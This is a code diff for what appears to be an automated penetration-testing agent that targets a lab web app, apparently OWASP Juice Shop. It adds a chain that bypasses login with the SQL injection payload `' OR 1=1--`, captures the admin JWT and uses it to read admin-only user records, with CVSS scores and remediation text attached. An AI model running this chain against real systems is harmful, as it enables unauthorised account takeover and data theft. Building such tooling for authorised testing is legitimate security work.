@@ -1,5 +1,6 @@
 import type { Severity } from "../events/types.js";
 import type { Session, SessionRequest, SessionResponse } from "../session/index.js";
+import { type Artifact, type AttackContext, latestArtifact, type SeedStep } from "./context.js";
 
 export interface AttemptResult {
   /** The attempt confirmed a vuln / reached an objective signal. */
@@ -11,6 +12,14 @@ export interface AttemptResult {
   /** Whether the technique even applies here (false on 404 / hard block). */
   applicable?: boolean;
   evidence?: { request: string; response: string; note?: string };
+  /** Artifacts this step discovered, fed into the world-model for later steps. */
+  discovered?: Artifact[];
+  /** Follow-up steps this confirmation seeds — the chain grows from here. */
+  next?: SeedStep[];
+  /** Objective reached — kept DISTINCT from `ok` (a finding is not the goal). */
+  reachesObjective?: boolean;
+  /** Label of the artifact this step consumed from a prior step (for evidence linking). */
+  consumed?: string;
 }
 
 export interface AttemptOpts {
@@ -20,7 +29,17 @@ export interface AttemptOpts {
   url: string;
   /** Lowercased tokens from the objective used as a generic success signal. */
   objectiveHint?: string[];
+  /** The run's world-model — artifacts earlier steps discovered. */
+  context?: AttackContext;
 }
+
+/**
+ * Chain technique names the loop seeds deterministically (independent of the
+ * model, so the flagship chain runs even cold / quota-dead). Matched by exact
+ * name before the free-form keyword classifier.
+ */
+export const T_AUTH_BYPASS = "SQL Injection — authentication bypass";
+export const T_ADMIN_ACCESS = "Authenticated admin access";
 
 /**
  * A single exploit attempt. This is the one deliberately small, lab-specific
@@ -43,6 +62,11 @@ export async function attempt(
   technique: string,
   opts: AttemptOpts,
 ): Promise<AttemptResult> {
+  // Chain steps are matched by exact name first: they carry state across steps
+  // (consume/produce artifacts) rather than being a one-shot keyword probe.
+  if (technique === T_AUTH_BYPASS) return authBypassCheck(session, technique, opts);
+  if (technique === T_ADMIN_ACCESS) return authenticatedAdminCheck(session, technique, opts);
+
   switch (classify(technique)) {
     case "sqli":
       return sqlInjectionCheck(session, technique, opts);
@@ -176,8 +200,27 @@ const PROFILES: Record<Kind, FindingProfile> = {
  * This is what turns a raw `ok: true` into something a consultant would sign —
  * never a hard-coded "high". A cited CVE appends a patch directive.
  */
+const CHAIN_PROFILES: Record<string, FindingProfile> = {
+  [T_AUTH_BYPASS]: {
+    name: "SQL Injection — Authentication Bypass",
+    severity: "critical",
+    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    cvssScore: 9.8,
+    remediation:
+      "Use parameterized queries for the authentication lookup so credentials can never alter query structure, and never build the login SQL by string concatenation. Add server-side rate limiting and generic auth-failure responses.",
+  },
+  [T_ADMIN_ACCESS]: {
+    name: "Broken Access Control — Privilege Escalation",
+    severity: "high",
+    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
+    cvssScore: 8.1,
+    remediation:
+      "Enforce server-side role checks on every admin resource against the authenticated principal, deny by default, and reject tokens whose subject lacks the admin role instead of trusting a valid signature alone.",
+  },
+};
+
 export function findingProfile(technique: string, cve?: string): FindingProfile {
-  const base = PROFILES[classify(technique)];
+  const base = CHAIN_PROFILES[technique] ?? PROFILES[classify(technique)];
   if (!cve) return base;
   return {
     ...base,
@@ -283,6 +326,8 @@ function isRoot(url: string): boolean {
 // a more specific in-scope URL (e.g. one recon discovered) is used verbatim.
 const SEARCH_SURFACE = "/rest/products/search";
 const ADMIN_CONFIG_SURFACE = "/rest/admin/application-configuration";
+const LOGIN_SURFACE = "/rest/user/login";
+const USERS_SURFACE = "/api/Users";
 
 /** When `url` is the bare root, retarget to a known in-scope surface `path`. */
 function surfaceFor(url: string, path: string): string {
@@ -523,6 +568,16 @@ async function accessControlCheck(
   steer: boolean,
 ): Promise<AttemptResult> {
   const hint = opts.objectiveHint ?? [];
+  // An unrecognized technique handed only the site root has no specific surface
+  // to prove anything against — an objective word appearing on the landing page
+  // is not evidence of broken access, so it must not confirm there.
+  if (!steer && isRoot(opts.url)) {
+    return {
+      ok: false,
+      applicable: true,
+      note: `${technique}: no specific in-scope surface to probe`,
+    };
+  }
   const direct = await probeObjective(session, technique, opts.url, hint);
   if (direct.ok || !steer || !isRoot(opts.url)) return direct;
 
@@ -531,4 +586,142 @@ async function accessControlCheck(
   if (admin === opts.url) return direct;
   const viaAdmin = await probeObjective(session, technique, admin, hint);
   return viaAdmin.ok ? viaAdmin : direct;
+}
+
+// --- the multi-step chain -------------------------------------------------
+
+const TOKEN_RE = /"token"\s*:\s*"([^"]+)"/;
+
+/** Show enough of a secret to prove it is real, without printing it in full. */
+function redact(secret: string): string {
+  if (secret.length <= 16) return "…[redacted]";
+  return `${secret.slice(0, 16)}…[redacted, ${secret.length} chars]`;
+}
+
+/** Bound a response snippet for evidence. */
+function clip(body: string, max = 800): string {
+  return body.length <= max ? body : `${body.slice(0, max)}\n… [${body.length - max} more bytes]`;
+}
+
+/**
+ * Step 1 of the chain — SQL injection in the authentication query. A non-
+ * destructive login POST with `' OR 1=1--` in the email field: if the lookup is
+ * built by string concatenation, it matches the first user (the administrator)
+ * and the server hands back a valid session token with no password. The token
+ * is published to the world-model and an authenticated follow-up is seeded. The
+ * injection string only reads the auth table; it writes nothing.
+ */
+async function authBypassCheck(
+  session: Session,
+  technique: string,
+  opts: AttemptOpts,
+): Promise<AttemptResult> {
+  const url = surfaceFor(opts.url, LOGIN_SURFACE);
+  const payload = { email: "' OR 1=1--", password: "x" };
+  const sent = await rawSend(
+    session,
+    {
+      url,
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify(payload),
+    },
+    `POST ${url}  {"email":"' OR 1=1--","password":"x"}`,
+  );
+  if (sent.kind === "result") return sent.result;
+  const { res, snippet, base } = sent;
+
+  const m = snippet.match(TOKEN_RE);
+  if (res.status < 400 && m?.[1]) {
+    const token = m[1];
+    return {
+      ok: true,
+      reachesObjective: false,
+      applicable: true,
+      status: res.status,
+      note: `${technique}: login returned a valid session token for an injected identity — authentication bypassed`,
+      discovered: [{ kind: "token", value: token, label: "admin session JWT", from: technique }],
+      next: [
+        {
+          technique: T_ADMIN_ACCESS,
+          reason: "use the bypassed session token to reach an admin-only resource",
+        },
+      ],
+      evidence: {
+        request: base.evidence.request,
+        response: snippet.replace(token, redact(token)),
+        note: "`' OR 1=1--` in the email field returned HTTP 200 with a signed JWT and no valid credentials",
+      },
+    };
+  }
+  return {
+    ok: false,
+    note: `${technique}: injected login did not return a token (${res.status})`,
+    applicable: true,
+    ...base,
+  };
+}
+
+/**
+ * Step 2 of the chain — consume the bypassed token. Proves privilege escalation
+ * by contrast: the admin-only endpoint is requested once WITHOUT the token
+ * (expected 401/403) and once WITH it. A 2xx only when the token is attached is
+ * authenticated access the agent was never granted — and reaching it satisfies
+ * the objective. Read-only; it enumerates, it does not mutate.
+ */
+async function authenticatedAdminCheck(
+  session: Session,
+  technique: string,
+  opts: AttemptOpts,
+): Promise<AttemptResult> {
+  const token = opts.context ? latestArtifact(opts.context, "token") : undefined;
+  if (!token) {
+    return {
+      ok: false,
+      applicable: false,
+      note: `${technique}: no session token in the world-model yet`,
+    };
+  }
+  const url = surfaceFor(opts.url, USERS_SURFACE);
+
+  const unauth = await rawSend(session, { url }, `GET ${url}  (no token)`);
+  const unauthStatus = unauth.kind === "ok" ? unauth.res.status : (unauth.result.status ?? 0);
+
+  const sent = await send(
+    session,
+    { url, headers: { authorization: `Bearer ${token.value}` } },
+    `GET ${url}  (Authorization: Bearer <bypassed admin JWT>)`,
+  );
+  if (sent.kind === "result") return sent.result;
+  const { res, snippet, base } = sent;
+
+  if (res.status < 400 && (unauthStatus === 401 || unauthStatus === 403)) {
+    return {
+      ok: true,
+      reachesObjective: true,
+      applicable: true,
+      status: res.status,
+      consumed: token.label,
+      note: `${technique}: admin-only resource returned ${res.status} WITH the bypassed token but ${unauthStatus} without it — privilege escalation, objective reached`,
+      discovered: [
+        {
+          kind: "data",
+          value: clip(snippet, 400),
+          label: "admin-only user records",
+          from: technique,
+        },
+      ],
+      evidence: {
+        request: base.evidence.request,
+        response: clip(snippet),
+        note: `unauthenticated this endpoint returns ${unauthStatus}; with the JWT from step 1 it returns ${res.status} and admin-only data — authenticated access the agent was never granted`,
+      },
+    };
+  }
+  return {
+    ok: false,
+    note: `${technique}: admin endpoint returned ${res.status} (unauth ${unauthStatus}) — not a clean escalation`,
+    applicable: true,
+    ...base,
+  };
 }
